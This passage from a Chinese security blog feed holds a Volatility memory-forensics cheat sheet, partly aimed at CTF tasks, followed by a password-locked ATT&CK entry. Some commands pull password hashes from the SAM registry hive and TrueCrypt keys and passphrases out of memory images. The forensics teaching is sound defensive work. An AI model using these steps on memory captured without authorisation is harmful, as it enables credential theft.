&gt;pslist.txt</span><br></pre></td></tr></table></figure><blockquote><p>当内容比较多时候,<code>&gt;pslist.txt</code>导出文本进一步分析查看</p><p>pslist无法显示隐藏/终止进程，解决这个问题可以使用psscan</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929142622740.png" alt="image-20210929142622740"></p><h3 id="查看隐藏进程-psxview"><a href="#查看隐藏进程-psxview" class="headerlink" title="查看隐藏进程-psxview"></a>查看隐藏进程-psxview</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 psxview</span><br></pre></td></tr></table></figure><h3 id="网络连接情况-netscan"><a href="#网络连接情况-netscan" class="headerlink" title="网络连接情况-netscan"></a>网络连接情况-netscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f xxx.mem --profile=Win2003SP1x86 netscan</span><br></pre></td></tr></table></figure><h3 id="cmd的历史命令-cmdscan"><a href="#cmd的历史命令-cmdscan" class="headerlink" title="cmd的历史命令-cmdscan"></a>cmd的历史命令-cmdscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 cmdscan</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621260906140-2bac6047-05c2-4cfa-8c0a-3f733106d1a7.png" alt="img"></p><h3 id="扫描当前打开的文件-filescan"><a href="#扫描当前打开的文件-filescan" class="headerlink" title="扫描当前打开的文件-filescan"></a>扫描当前打开的文件-filescan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 filescan | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621261465665-64b38d3d-5eba-4336-aa16-b8ba1e647f87.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file_patched_tjctf.dmp --profile=Win7SP1x86_23418 filescan  |  grep Downloads</span><br></pre></td></tr></table></figure><blockquote><p>找下载的文件夹了，一般windows下载的内容都放在 Download 文件夹中</p></blockquote><h3 id="内存中隐藏或注入代码-malfind"><a href="#内存中隐藏或注入代码-malfind" class="headerlink" title="内存中隐藏或注入代码-malfind"></a>内存中隐藏或注入代码-malfind</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 malfind</span><br></pre></td></tr></table></figure><h3 id="进程装载的动态链接库-dlllist"><a href="#进程装载的动态链接库-dlllist" class="headerlink" title="进程装载的动态链接库-dlllist"></a>进程装载的动态链接库-dlllist</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 dlllist &gt;dlllist.txt</span><br></pre></td></tr></table></figure><blockquote><p>其显示列表主要包括加载的动态链接库文件的基地址、文件大小以及文件所在路径</p></blockquote><h3 id="缓存在内存的注册表-hivelist"><a href="#缓存在内存的注册表-hivelist" class="headerlink" title="缓存在内存的注册表-hivelist"></a>缓存在内存的注册表-hivelist</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/wtl/mem.vmem --profile=WinXPSP2x86 hivelist</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621566147801-14dafab3-05ce-4f71-b15c-2dde927e9f01.png" alt="img"></p><h3 id="打印注册表数据-hivedump"><a href="#打印注册表数据-hivedump" class="headerlink" title="打印注册表数据-hivedump"></a>打印注册表数据-hivedump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/wtl/mem.vmem --profile=WinXPSP2x86 hivedump -o 0xe146c398</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621566422727-46e1ee24-2dc5-4076-a3ed-badee02b53e4.png" alt="img"></p><h3 id="内存中的系统密码-hashdump"><a href="#内存中的系统密码-hashdump" class="headerlink" title="内存中的系统密码-hashdump"></a>内存中的系统密码-hashdump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929192633385.png" alt="image-20210929192633385"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f name --profile=WinXPSP2x86 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）</span><br><span class="line">python vol.py -f name --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621579773461-e80c098a-7777-43b1-b3ed-d67becebe97a.png" alt="img"></p><h3 id="程序运行信息-userassist"><a href="#程序运行信息-userassist" class="headerlink" title="程序运行信息-userassist"></a>程序运行信息-userassist</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 userassist</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929192842966.png" alt="image-20210929192842966"></p><blockquote><p>包含正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息</p></blockquote><h3 id="查看SID-getsids"><a href="#查看SID-getsids" class="headerlink" title="查看SID-getsids"></a>查看SID-getsids</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 getsids</span><br></pre></td></tr></table></figure><h3 id="寻找可能注入到各种进程中的恶意软件-malfind"><a href="#寻找可能注入到各种进程中的恶意软件-malfind" class="headerlink" title="寻找可能注入到各种进程中的恶意软件-malfind"></a>寻找可能注入到各种进程中的恶意软件-malfind</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 malfind -p 3088 #-p指定进程</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929194837418.png" alt="image-20210929194837418"></p><h3 id="获取SAM表中用户-printkey"><a href="#获取SAM表中用户-printkey" class="headerlink" title="获取SAM表中用户-printkey"></a>获取SAM表中用户-printkey</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929195635140.png" alt="image-20210929195635140"></p><h3 id="最后登录系统的账户-printkey"><a href="#最后登录系统的账户-printkey" class="headerlink" title="最后登录系统的账户-printkey"></a>最后登录系统的账户-printkey</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f mem.vmem --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogin&quot; </span><br></pre></td></tr></table></figure><h3 id="时间轴线-timeliner"><a href="#时间轴线-timeliner" class="headerlink" title="时间轴线-timeliner"></a>时间轴线-timeliner</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f name --profile=WinXPSP2x86 timeliner</span><br></pre></td></tr></table></figure><blockquote><p>多个位置来收集系统的活动信息 </p></blockquote><h3 id="查看windows服务-svcscan"><a href="#查看windows服务-svcscan" class="headerlink" title="查看windows服务-svcscan"></a>查看windows服务-svcscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f memory.img --profile=Win2003SP1x86 svcscan</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929211905541.png" alt="image-20210929211905541"></p><h3 id="保存内存中的某个进程-mem"><a href="#保存内存中的某个进程-mem" class="headerlink" title="保存内存中的某个进程-mem"></a>保存内存中的某个进程-mem</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem --profile=WinXPSP2x86 mem -p 1180 -D E:\111</span><br></pre></td></tr></table></figure><h3 id="提取内存中的注册表信息-dumpregistry"><a href="#提取内存中的注册表信息-dumpregistry" class="headerlink" title="提取内存中的注册表信息-dumpregistry"></a>提取内存中的注册表信息-dumpregistry</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 dumpregistry  --dump-dir=D:\text\</span><br></pre></td></tr></table></figure><blockquote><p>dumpregistry –dump-dir 提取内存注册表的目录路径，test先创建，最好不要在C盘</p></blockquote><h3 id="解析MFT记录、导出MFT记录-mftparser"><a href="#解析MFT记录、导出MFT记录-mftparser" class="headerlink" title="解析MFT记录、导出MFT记录-mftparser"></a>解析MFT记录、导出MFT记录-mftparser</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 mftparser</span><br><span class="line">volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 mftparser --output-file=mftverbose.txt -D mftoutput</span><br></pre></td></tr></table></figure><h3 id="获取TrueCrypt秘钥信息-truecryptmaster"><a href="#获取TrueCrypt秘钥信息-truecryptmaster" class="headerlink" title="获取TrueCrypt秘钥信息-truecryptmaster"></a>获取TrueCrypt秘钥信息-truecryptmaster</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 truecryptmaster</span><br></pre></td></tr></table></figure><h3 id="获取TrueCrypt密码信息-truecryptpassphrase"><a href="#获取TrueCrypt密码信息-truecryptpassphrase" class="headerlink" title="获取TrueCrypt密码信息-truecryptpassphrase"></a>获取TrueCrypt密码信息-truecryptpassphrase</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 truecryptpassphrase</span><br></pre></td></tr></table></figure><h3 id="提取进程PID文件-procdump"><a href="#提取进程PID文件-procdump" class="headerlink" title="提取进程PID文件-procdump"></a>提取进程PID文件-procdump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 procdump -p 1848 -D ./</span><br></pre></td></tr></table></figure><h4 id="dump文件-dumpfiles"><a href="#dump文件-dumpfiles" class="headerlink" title="dump文件-dumpfiles"></a>dump文件-dumpfiles</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 --dump-dir=./</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621263396438-2e0d552d-9911-42ae-8667-a2bf7bb256b0.png" alt="img"></p><blockquote><p>先filescan</p></blockquote><h4 id="导出dmp文件-memdump"><a href="#导出dmp文件-memdump" class="headerlink" title="导出dmp文件-memdump"></a>导出dmp文件-memdump</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/wtl/mem.vmem --profile=WinXPSP2x86 psscan</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621580643912-3bf7b029-326c-44fe-9ecf-696646029882.png" alt="img"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621580758835-f2e4a842-e56c-4650-808c-73bf6f1367cd.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK</title>
      <link href="/p/faa03718.html"/>
      <url>/p/faa03718.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="924785f05f259b91d89d98a919e6710bd99f7f6a6b67a6ba798b4d4d8e33b0fe">c157c9744e0298d00173c08a9dbffe0e939d389727a699581f91a6c4d6e8a55849532c5304b0d137702038d659e790ad98422f965b637fb91095a8f0fc7e1e2bbccfab45959d62cb34e64c40ee41f21f8445e4e83da8100cb592a0b754a519d812f87089aa4beb496ed0f5cfe397ae396d7fad0ed644bc734fa6bc134f5d93434cf49701d74b319b4f4d656ee039bbcc22b695c5a67660b9c90f767486a2853ca9b44c9e5ebf69dfa3003e1728420909ba183b4a8bdb3ad267e955955da18b258443d69ceaf6a892f0d2fabd74b9be920d5573744214265120f8e4bd67681398429b7caf01569043d186bb2fa9a2b701215134a1b9192ae3c05b6cdff67f9b13ca99ea6b5cef38eb890df72e6bf8f401c7d4807cfc347cc8b043e87676acf8af7a4a87b8f1749907bf0edc2268e776eb19b82342fe0cd4f8aa4420b2fa9cf256447a6207e078908e597d4aece5152cc2621bda4cc2d8053ed6b39006ad5de64d37f0a50070190789999ea77a59606cebaa2b66c8ae2a0280a915f4300c53201cadbbb2701eed4f77291635882162887fe82a592fb0fa384a648bf784b591209cda2aa044ab19fb5917bad39845d9ae6f2c41bff2b63c5f6811dd7a8bbe3ff00e78c73e5cc74a7fec7a60fc30127242d60dadacb107d8fb06605f736d2732d1be05b477e34f5fe020d5ab8527ee922df566ab5964ff9eccd9c27cfa07bf29531c816101056b058b7ae7b7f82da7849b3c0c272dd0a540454c13eb9b0cfc208036c1ae75926a63678115b27be94d67a6a7f8661a34f6d61d513ffa9ef6d35f5a24b7e30b0aee409b937f13a474a1cc80c35d66281ce0fc6d74bbd9f75cf706f3848caae22286fe292e727ccd0350c169887df37d508ada71dfaea4e97eaa1c8739c5cbcee70a9f7ea0a38be49ed23170dd63566eced8c25e0b1b5c194cff2b951caf92d4fc1822ca7d543092eb4baa4cb5fd0545796351d81d01f4b040cb6aaf9305f77dcf0e76d52f29f1cb2fe8815e4e6a6612aeb4be0a3066a8a8ffb268d618ec7a197d5680d2053622d90bfbd569d507878b053c1365f673f91f88bcf47f9273716bbc2dcdeb21f6055155b531da31c83785df0dc34ad2d5e2c5d877fc685780f20f32ac871209afc02495b70cb388bc2a21be97749dcbf4d854a95cd13e2074d3f46bcb14bfacbecbaaa98086a68142fb3d5479c7c20c2912b89ef493e0cf5732728f7f8ac95cadf48116eda0d4b5a6ce560416ca301417807e431a4aa0b57e24d7dbf01f7c2f6a8c5fbf8479375135da7a56cae952763b53aafe9056ee55363b0f1a1b38ab7bdab7150777ec36d2c5c21f76037741f2444809ff7979f4b02de57912e216b3aa70a348cab9ba83eb8a47ae4f4c3cb70c92cc1401dce8fe98a7d8c0b9a123d94f552ecb881b737e7d2b15e3939abc4cc5de68672ffe91225c8322d972308dd76b3ba6b21494efddffc3e6a4ab46d7cbd04e71a2b380e9660ec8d5090f6ec048bfbea546bd8b7b706bcedac944e25845877985f939b5c9c0f1b3d10e195b7b0a4abfb9b410a6471818f0b17d2ce339028af5e778a4ad2411498808f102e552a4dd3742a689c84731e7cac0b19f0253379f9b505f9238f92b5e30bf3c0e983bf3a088b1cfe880692b6b66598286b449042c57bd40936de2a13f7c40aaa8a672b67c31ba7e9b4ac37d98bbbfeac0c1152152267e715a90b779d55ea66e1cd8fa5b1fc8526eda3a1be37fd20fe5a99d480f66c434fb93eaf6a6bf3ae7cb910b6afcab44a01be85be9171116da21258217905e00f9bfdbb0306717c5c863b71996c206d6752e0176de01522ad46df8331bdfc4a2a502aac4165b3103e8601d595025f74e34c8c4289347f74e231a96cc385b30160351b866c03f4b9a56683304dcc856ce9176ae2f565c17a773a9e2c06918772759c41ec28c122839a9ed52b8175c34707af63ec8a2906fc650fef8f8d121570c886677b33740074661be19aca2434d0a82d85dc0f4f1f4910fc90812edb27fed4d548828f7cc95c093b2ab6cfa633112ad8f0ec935eabcaec6208961b9c32c8517d301e852187c40200f71e5bf2e150782e318675760f2dd1995438ab37255bff6061e7bc1e3fb9ebcef38755326710409e5ff77405ece5e005615007d3ecbc73c06d08f580fd4b96f7678dfef5fc3553c4862919337e924bc296c869a4dbf7ff6ff75b92d4750f84233b94715f056d96eb2c8d5e1d60593496358b6bf8a8717aaa20a755aee64f3792963292ca670b97b974984c9b5a4a10ca954e0201fea3212f30868ce8bd56caf7a8ee90d032ee5ad41946df205efb0bf5940d03e1c1993e5a5705f6b487d2376f6de2260a4c7d7308f0fef387a6b2dad82f643b44e5ab09f1701770bfa4904a4ed0c2efb5b6d4421866acba13d18bd3ea4ed7239eb976878916db877aa09b210ee7baf7b6293fbf1ce398a62251a8a0e7df34123d999210e122901a559330c615912543f39282d62fbc4e72fbe7cc21a5bf43ad4a197bb215eeed4e052dd4829e640cfa1b631f84451d3ec9a00f7eb92f3da1d165d69e667437e790e5c8d1498ca06eff3907f5d547178561c784ca7408d7099b04ef15f110919f3c303c6955249b67231d92c2262693839514c84adbffd182d1224f4ab62efcb7c3a03a709903a8737770b1a7add7cf310e5f6fb7891543b5ee70c04084229f65cc3ba3a495a84ffd6f6d0194b3095a209012edb1e30ea48091bfd7a0cc7dfece4fa4c15293674e98a13ae20c150316a92776814bb2ef7afb73d086db318248c4faf1cee67f1df0091894dd1705133cb44fe6fea8100c58e195748b4a0ed72dbd7680a168a4bb2954526215f89e70924c625cb24572af673eb1f13b3ed8625acb4fe4b6d968967fb631ae7a2c16a7e55c1c8484dab16b12d43afbc514e8a2c6053a94a69a44f3684edbfd5472f8c812cd3c09da43cd4d89280d4c7d6a9954a5a9aa552bb4e250927b5b81dbe29a06d414174b11b6c94b3c1ddedd5fbf242148c8626f008fc09ca47115444ad18a5e38563a5d11537d5a677e64dcf26a6d7b7b0fb876c82856421a8b1c3176c20daa06e47fa69871b7d55515f6dbb7b0a1fa89f546e27242d7770be382e2e49089f4f0582551e77d4df7dc0bf97e4f9df5e5d4973d231e81b77777997065d3f2e03f97b744bf186732e9386a5cfc1fab3b2cc71635075630cf1ae41eff5ef8c6c1b9db1389fc602c1299f3f299f5c11015004ec29706fec6692ad1ac1f54a3cee24804031fef7c1f72d7fca0620e59069bb4703fdd3b6c357a00a356309c2678d80bf0efe2728b4d0c70a4529172c2de42fc7b3d09080c1462800dead3d20d4250a908f0fa81d407e02a74c1892773ba0edd2871ce0650f72123404d62d29448525cf92a748742caf298542b5a3167c06e1f8795ae4571d6ac7a21cc57877b08a8d47f99cbdf773f609e0b0c800a5928183e53f4d693cbc561c8e2b329a53156b651361e6c6b8e24b1c585bce82d836d769a497499b7e818c66f0fa33b22a2fb946be4acc3ec6a852c5fbb2c90479f26d3b1dc77ebaaf64efb2ad139de3e694be6c9697fce87af9451485f550bfe4837aefb06eca6e62f4d82ff42acec69d1c6deeae7266a3d04c2b436869f3006ede9368ac996a2456f142185da28fed6cda0ec05e5108e4f95e5ff53a2e04a01f891905ac8a6d2d9a0931002f53ee78cc291907152a0bb7655d91ab181aa9e46b42e46c719b8abebb50b419b0d45adc8395e5f359c1cc211e412c41c2ba6469d5630563278880f6db36196a8057e292dcd77f86d6fe751bc7a5a88f903aef3ffe68692c07443c5407aeedab22e58bd4fbe5b95bfb815984428c3fc4006eb3a2d5ff12c84fc86d2d849ef2b5fe9af0528f2909d96138eb918dbd5ec7895c23c9aa21d756fa0805f4a00d7ca4a5ab6a45b19aa8d5bad47e7fa9233ffacdecb4162e2065642c8ac23a3ad33536a6945194f4ea5dfa33bfe792050fe73d4736070b9b2e88bac18adc0bf50a8f22fb967f6c7b1e6fa05aa2d247f1ef11c4a6e08ed5eedaf3feadcd5246bd2b9e494ae020e076629767aae64f631a3d392bf90e6d9141d57ff260e6851b91af711b6dc4cfbb2ec43f2eabb8536f4ea50d7848a4f37a7d1ac49ccf284f1ddd4bac0778506a9e37530cc39800eba8a8a16a080d2fc084f63bdfec4a1879fc5250c1ab223348b5f59c24644eb832c79ef9aca7781b62e7cb53394b913f43d8c76270cf206a3795a393034af15330c942ec42e6c0d832dfbce6b0b95e5c142187e13d5ccb53ba267f398d91442a50fa3123f07417dae6d2041fc56546201d6c12c3b7d73935e544c2b51454754d76c490bafd51ccd81e335ee2ac2b8b58441719dcb4b980ea2d86ec7012c4bae7c444adc2179f2c5f0c787b1c3b6e40c957e0efc7d702a135190e19fd23b6c2d2abf5b5d16c793de8cb1b8d2860593e701e31ce418b5025295fe94508fdf8e1cffd86a278d20634e882e35a0b2f016373c4496e59a6843aa1b6e41a232a5189a5a1a6730ce436caa150fe312223776001642ec8f0805eba76acb530b7d69611bfaba4f49a1f89c182ac6beec4679e128986331173c410cb3c273d50fd15ff0dc9477136fe5a82fd57bdfcccb50114d8c9a3ac88280405c50f9a4c46a77ed81df18b33a5ad3c220289953559d38ee0d618228243945ae7a3c12ccf781fffb08aa3b01a69bb8d1e8fe1e9b96e82bc0ce5c38ee7bc7457cbd0b03fcd1b8ed2682580c2001868d21a82e90d7217f5f22c4ec2c459236a4ded69cd94476bd38cf2673ed084f80c216077d34843e285d0e421c7ff2ac20fc0b3b12b0caf5d92ad347b9bee27995c49fadab8b450a3273f2033dd2544e5ed170b9aba280353e211d9ec4046092f76daa4e3e72212ee8aeea4eb20099ca8a9f83404a7ef4a00e156b4505b5fdc65ad6699768f03dd97682eec252d2fdc6d3b113231d08194b7fd0eeb68b7fc82768bad9b8861745d567597336db24f7bfebd8a70a5ff7934842d2a1c5aa6fb3be1af3d3ec7e9a9452a3beb94c5f086cd5408a2c4a0e1c6e8f350270a348040fbf3a123b67cae1b280c22ec4660043e07e8f9844f786da85a25588c9724f342f90193aafe412c6873fb16565fe4615c37acf8a97cd8e66112134d1c83f6f9d0f44a9917d042fce53960e9d775953143da239e00e1d43588f4c5c9edd5e25bb526d56f7c11bf5f907f35ccfdb124591f0e7ae74bcb68a5f45fedffe1d166dd265a6fbac29198cf40bae57dc2d35dda054c8181dec1a567f83493750ff3a9b24eba4bf44d33db39e5244b95e9b8d14c1b42ef7cd3c7c62dc7ed43d5068485640c3395e4ecbca432b86a02d8c5cfdc11aeac39d670854603d46c76416c37649a4dcb8ddfa129419f16a24d552991478f4f1b87886b605c09ebcb336b18ae83b834e74a39e50b8c41a32a94f21c338fd21921cb3567df3a473195ab58254d2b691a3d053bd8d415796cfb6be9ce2a338d5fdf247a9dcccb10c4b61f0b4f99141b3f56b130d315b2cf9f3b3db1fce0acc1daa46f37c51846f113887b3bb77769fe75c81366e07f744d0729b1e0f6b49aedb46ee60d1a05a8bfda998b917288fb9037777ed07e618daed393e890113a3a2154d597c34d4085cd22b41f827f1ff7d427c48d58bd54653ee5fc4067551618fdbdee3507ee0a692a9c8dbfb8c0e8bf5890358116907983f2162c749ecbec491d0e4fa3cc46e28e3e92accb51b4fda08f9b7348c09058e6639454698946fcc60201268a0eda6ae9426102d7388b99f6bbf58c4c1b7a3e179a798d9d6386b96436ff8ee1ac89501eb5ed2f1f68c1690619935705742b312eec546b487c8dc45d8869471976d177868488127af19cc0670aa9fdb195376bfd7f2fd28f060ebbfb91a9ef115335a362cbb531e2cedbda7fc5ab18db5095df07d134623cb4a510922f295acedfa09df2d7293bf387aad0f617739af4dd4617a4a893a256a5e043be6a05d393632ac5de66aca93d6e6f6948b550966000970490446ed44613035c533c13807b2a48d7405ee9539f87b38651e33eee8c556fe2c85a8710f647a1f23dab1a10522a5c74631e798ca2b79872af24f4808ec9c683244bd04d70234756c97b0cd6a181fa6180b7b1367871949d41cad3cb600087f870fa6edf530fac5b2771f97638ffc771959c3f3f2d4c8398bee9214ef227d80a991edc141295150591d92c82a9f031ab58824b53b0d42fcc2806568e7c14ac049f4d39408838254f391988f8c3db8cfab0b7537d962b6c95a5c46113c2581e2db2bdeb30dad2743532afb0ac75bd86cb465bf65f3e2c12efdc14e11a2998e80d16097f10667d60a8c565b8db7a8ea67335a16606345f7f19f411bd8610c5073050e1f168264e94cd4ecb9c705755792b7ad47224e1ab4aba79b0334b4271f1b999ed34c3617c1044dcd443bcea5cae3905a5fa600a3eae489401ce0d54d75386e576538e56fda198f72e432b188ee29c9619a8988f60d23c88ba9fa6aa4d3d7773d0a51ba9199e097b4132feeef1548b6127cb0fa0ddce66627539b8f08c11b071eefcef923cdfe39e1ce10cdf833a214c1b466e1fe8f938bd428aa3185854edd0017a99d0e626d900a70554cd611134810ed44de2b732f9879988f73e5c64fc603785684a968b6dac4728dfd2d9776b4c36d577b32cc077eb110390aebc7a90259e60afad1790552f38b4525867841f4970cea2bc30eb4dde4d2e5f3ed72ab4f72cf87b4d3c66d2c3f1065bbb35d32941e5dcad83ca78f818eedfb920f23a679f47f6d3a7edc81c654c3a663c43162c33460d213cb38d8a585553d87228569d00247577e29f0bf919982c9a0cafcc6cac32a247305ca765614628304f74e7d759585219a8377476c084a521ebad383f9866d81e7e264c9e7bc3b849c5b9062f2608ccc288c2e0fe4a61d1512d3d27c434a17f2abd3895fea8535eda97e2ac5a840db3a1ceae4d0ae375d106dda4f3e87a128d032fa345ff60490bbb224266a2139bb27bb9c528a0047f26b2e2ae8a33b3f151147ccc862742d4d934e8243c79d02377651a8aaa3309f6772282beec6bdd02496e630051e02b364fdd8dd4f256c778619d4a841353d07be6335e811c54c851ed92ad2026eb416aa63cc2bdcab733a817fde3dbeecb7ff85a8666c89e7f74df9db6f928e1d4958eb01ea2951a5e0f44e7114abe529d20810bcadf06c13dde582c1720962d5030b7ff2d8b88e2c0bdb9fa79838957a78fb20507939c2b9e8c6e2190cf4de780ac71eb8759214c69493e281637320cc9fd98cfc829598855e33eafeea6acc6e2fbf465df3956be5b5813bd854854b55e005f5c6b1b56907ab5cad89ed9e883d499d0e7781ee222b9addb5597847e54aa97cbe0e74ef5b0e26ded61324211a8189e3284375f855f1f09bbc14d23ae14ac47c04379f3dfa5517b632c04eac40e08fbbb6f641fda6d8995ae42fc63b54292334c91b3a1a0d498666d3c31a3dd3dfb3ec47978a908693e0e83c32aa3e624b9e89ef8fabf74b75418e4674321f8765d85c76f36769cfe8024378b44425f6d7e4696737cf978ea9dfc537ae7126f37ca3b5dceab65cdd36adf8447413812529c94b52df19552be9371b237b89d0f6deb9e1102af4e52f26eef0919ef4ba7df359c11cf90aad779624b52164564293bfa1e808d3af80da69911ad34fe4af274deeda89664084b1bfde8045582566dfac5afebfe67efa792befce55e44da0d6d0aa789da889fb158bb744961c1506cf5c7989628da988ada8ccfd64dfc5166985c2ec730bde8b20de89d0cea621ed0d203f4c0d13cfd193ff6e34551a9d472fa82dca3396def507164aacdd5aa8087f00eb7440e7c89bfe5f9c0e6d9495c00cfe8ae297b2e82f31ea7a1884710e40044abec58e7f2339d9acde479b42aa09cc6742dc8fbe08ac14da98cb36b4c14c248ce668b09c9c387555b10864ff305c8e613d11c74114d3c70a88bc8605e12df4c3a90f63876aac47643e3137dc59c534377779ae27414dbe90bbed1a9bb7aa972bf9cefe3eb27cca96c7edfe78672931c4505ab1c794fd29cf3013186986b51bedd422013090bf259acb1edb7d33eacf418c10f1146493eb4407c7ffa2fa4cbaa1416a26165f5a1f4917c2f16cde0c02f51f99a57e47b345b30c3af7db1bd26bf07bc7bc3f49c6a3e8ab7bc5ca2cffcb55f32e903b7968b8f1224fc97191ebe70647b44030e37269d1132911b9418a4a914a075f8cbc3fe59036d5f7530c2ee9ffe14879b70c45addac61105010a6b6fab7daf1d054b3e1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 蓝队建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php代码审计学习</title>
      <link href="/p/102b9580.html"/>
      <url>/p/102b9580.html</url>
      
